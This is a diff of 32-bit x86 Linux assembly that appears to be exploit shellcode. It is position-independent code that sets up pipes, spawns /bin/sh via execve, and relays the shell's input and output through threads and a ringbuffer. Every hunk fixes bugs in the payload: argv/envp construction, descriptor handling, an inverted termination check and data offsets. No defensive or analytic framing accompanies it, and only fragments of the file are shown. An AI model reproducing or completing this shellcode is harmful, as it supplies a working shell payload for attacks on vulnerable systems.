@@ -8,8 +8,7 @@ start:
 	call near shcode_start
 shcode_start:
 	pop	ebp
-	sub	ebp, shcode_start
-	add	ebp, data_start
+	add	ebp, data_start - shcode_start
 
 	; pipe(m2sh)
 	xor	eax,eax
@@ -73,16 +72,21 @@ child:
 	cmp	eax,ecx
 	jne	leave_sh_interleaved
 
-	; execve("/bin/sh", ["/bin/sh"], NULL)
+	; execve("/bin/sh", ["/bin/sh",NULL], [NULL])
 	xor	eax,eax
 	mov	al,11
 	mov	ebx,ebp
-	add	ebx,execve_command
+	add	ebx,execve_command		; ebx -> '/bin/sh',0
+
 	mov	ecx,ebp
-	add	ecx,foo
+	add	ecx,foo				; ecx -> foo
+
 	xor	edx,edx
-	mov	[ecx],ebx
-	mov	[ecx+4],edx
+	mov	[ecx],ebx			; foo := @'/bin/sh',0
+	mov	[ecx+4],edx			; bar := NULL
+	mov	[ecx+8],edx			; baz := NULL
+	mov	edx,ecx
+	add	edx,8				; edx -> baz
 	int	0x80
 
 	; fail if execve did not work.
@@ -96,15 +100,13 @@ parent:
 	; close(m2sh[0])
 	xor	eax,eax
 	mov	al,6
-	mov	ebx,ebp
-	add	ebx,m2sh_0
+	mov	ebx,[ebp+m2sh_0]
 	int	0x80
 
 	; close(sh2m[1])
 	xor	eax,eax
 	mov	al,6
-	mov	ebx,ebp
-	add	ebx,sh2m_1
+	mov	ebx,[ebp+sh2m_1]
 	int	0x80
 
 	; clone:
@@ -113,6 +115,7 @@ parent:
 	mov	al,120
 	; CLONE_FS   | CLONE_FILES | CLONE_SIGHAND | CLONE_VM   | CLONE_THREAD
 	; 0x00000200 | 0x00000400  | 0x00000800    | 0x00000100 | 0x00010000
+	; CLONE_PTRACE = 0x00002000
 	mov	ebx,0x00010f00
 	mov	ecx,esp	; just use same stack. we don't need the stack, anyway.
 	xor	edx,edx
@@ -146,7 +149,7 @@ reader_while_fds_ok:
 	; test, if master requested child to be terminated
 	mov	al,[ebp+terminate_child]
 	cmp	al,0
-	je	do_terminate_child
+	jne	do_terminate_child
 
 	; if ringbuffer is EMPTY ( _reader == _writer ), do nothing.
 	xor	eax,eax
@@ -337,7 +340,8 @@ rto_writer_pos EQU $ - data_start
 rto_reader_pos EQU $ - data_start
 	db		0
 
-execve_command	db	'/bin/sh',0
+execve_command EQU $ - data_start
+	db	'/bin/sh',0
 
 ; =============================================================================
 ; stuff that is not required to be initialized:
